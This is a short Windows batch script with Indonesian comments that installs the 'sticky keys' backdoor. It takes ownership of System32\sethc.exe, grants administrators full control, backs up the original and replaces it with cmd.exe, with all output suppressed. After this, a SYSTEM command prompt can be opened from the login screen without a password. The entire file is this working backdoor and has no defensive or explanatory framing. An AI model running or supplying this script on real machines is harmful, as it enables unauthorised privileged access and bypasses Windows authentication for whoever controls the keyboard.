@echo off
:: Ambil folder lokasi script saat ini
set "scriptPath=%~dp0"

:: Ambil alih kepemilikan file sethc.exe
takeown /f C:\Windows\System32\sethc.exe >nul 2>&1
icacls C:\Windows\System32\sethc.exe /grant administrators:F >nul 2>&1

:: Backup sethc.exe asli ke folder script
copy /y C:\Windows\System32\sethc.exe "%scriptPath%sethc_backup.exe" >nul 2>&1

:: Gantikan sethc.exe dengan cmd.exe
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe >nul 2>&1
